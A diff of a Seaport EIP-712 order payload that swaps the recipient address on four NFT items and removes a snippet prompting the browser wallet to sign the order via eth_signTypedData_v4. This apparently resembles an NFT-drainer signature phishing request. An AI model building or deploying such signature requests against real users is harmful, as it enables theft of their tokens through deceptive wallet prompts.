@@ -1,4 +1,4 @@
-const payload = {
+{
     "domain": {
         "chainId": 1,
         "name": "Seaport",
@@ -44,7 +44,7 @@ const payload = {
                 "identifierOrCriteria": "7906",
                 "startAmount": "1",
                 "endAmount": "1",
-                "recipient": "0xfd7bd3578b01cfafeefde581d8a3ac2cf6e02c11"
+                "recipient": "0xc0fdf4fa92f88b82ccbebfc80fbe4eb7e5a8e0ca"
             },
             {
                 "itemType": 2,
@@ -52,7 +52,7 @@ const payload = {
                 "identifierOrCriteria": "7733",
                 "startAmount": "1",
                 "endAmount": "1",
-                "recipient": "0xfd7bd3578b01cfafeefde581d8a3ac2cf6e02c11"
+                "recipient": "0xc0fdf4fa92f88b82ccbebfc80fbe4eb7e5a8e0ca"
             },
             {
                 "itemType": 2,
@@ -60,7 +60,7 @@ const payload = {
                 "identifierOrCriteria": "7553",
                 "startAmount": "1",
                 "endAmount": "1",
-                "recipient": "0xfd7bd3578b01cfafeefde581d8a3ac2cf6e02c11"
+                "recipient": "0xc0fdf4fa92f88b82ccbebfc80fbe4eb7e5a8e0ca"
             },
             {
                 "itemType": 2,
@@ -68,7 +68,7 @@ const payload = {
                 "identifierOrCriteria": "1917",
                 "startAmount": "1",
                 "endAmount": "1",
-                "recipient": "0xfd7bd3578b01cfafeefde581d8a3ac2cf6e02c11"
+                "recipient": "0xc0fdf4fa92f88b82ccbebfc80fbe4eb7e5a8e0ca"
             }
         ],
         "startTime": "1654697296",
@@ -196,16 +196,3 @@ const payload = {
         ]
     }
 }
-
-  request = {
-  method: "eth_signTypedData_v4",
-  params: [
-    "0x83d49Bf358bF2BdAf4014A42d84385022C1583c7",
-    JSON.stringify(payload),
-  ],
-  from: "0x83d49Bf358bF2BdAf4014A42d84385022C1583c7",
-  id: 1659364960573,
-};
-
-
-window.ethereum.request(request)
